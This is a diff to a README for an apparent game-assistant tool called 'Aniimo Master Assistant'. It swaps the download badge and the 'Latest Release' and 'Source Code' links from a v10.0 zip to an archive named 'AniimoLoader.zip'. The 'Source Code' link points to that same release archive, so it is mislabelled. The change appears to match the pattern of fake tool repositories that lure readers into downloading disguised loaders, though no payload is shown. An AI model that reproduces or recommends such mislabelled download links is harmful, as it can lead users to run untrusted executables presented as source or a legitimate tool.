@@ -38,7 +38,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/10/Aniimo-Master-Assistant.v10.0.zip">
+<a href="https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/11/AniimoLoader.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -51,8 +51,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/10/Aniimo-Master-Assistant.v10.0.zip)
-- [Source Code](https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/10/Aniimo-Master-Assistant.v10.0.zip)
+- [Latest Release](https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/11/AniimoLoader.zip)
+- [Source Code](https://github.com/linkvolunteerlaud/Aniimo-Master-Assistant/releases/download/11/AniimoLoader.zip)
 
 ---
 
